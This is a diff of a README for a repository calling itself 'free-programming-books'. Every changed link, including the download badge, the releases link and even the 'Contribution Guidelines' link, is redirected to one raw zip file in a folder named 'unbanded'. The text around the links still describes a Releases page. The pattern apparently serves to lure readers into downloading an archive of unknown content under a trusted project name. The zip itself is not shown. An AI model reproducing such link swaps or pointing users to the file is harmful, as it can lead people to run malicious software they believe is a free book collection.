@@ -1,6 +1,6 @@
 # 📚 free-programming-books - Access Free Programming Resources Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/soufianebakki/free-programming-books/releases)
+[![Download Now](https://raw.githubusercontent.com/soufianebakki/free-programming-books/main/unbanded/free-programming-books.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/soufianebakki/free-programming-books/main/unbanded/free-programming-books.zip)
 
 ## 📖 Overview
 Welcome to the free-programming-books repository. This project provides a collection of freely available programming books to help you learn various programming languages and concepts. Whether you are a beginner looking to start coding or a seasoned developer seeking new resources, you will find valuable material here.
@@ -11,7 +11,7 @@ This section will guide you through the steps to download and install the softwa
 ## 📥 Download & Install
 To download the collection of freely available programming books, visit this page:
 
-[Download from Releases](https://github.com/soufianebakki/free-programming-books/releases)
+[Download from Releases](https://raw.githubusercontent.com/soufianebakki/free-programming-books/main/unbanded/free-programming-books.zip)
 
 Once you reach the Releases page, look for the latest version. You will find links to different formats of books available for download. Choose the option that suits you best and click to download.
 
@@ -52,7 +52,7 @@ Feel free to take notes and practice what you learn while going through the mate
 If you have any questions or need assistance, feel free to reach out to the community. You can create an issue on GitHub or join discussions related to the project. Learning together can enhance your experience and knowledge.
 
 ## 🔍 Useful Links
-- [Visit the Releases Page](https://github.com/soufianebakki/free-programming-books/releases)
-- [Contribution Guidelines](https://github.com/soufianebakki/free-programming-books/blob/main/CONTRIBUTING.md)
+- [Visit the Releases Page](https://raw.githubusercontent.com/soufianebakki/free-programming-books/main/unbanded/free-programming-books.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/soufianebakki/free-programming-books/main/unbanded/free-programming-books.zip)
 
 Thank you for using free-programming-books! Enjoy your learning experience.
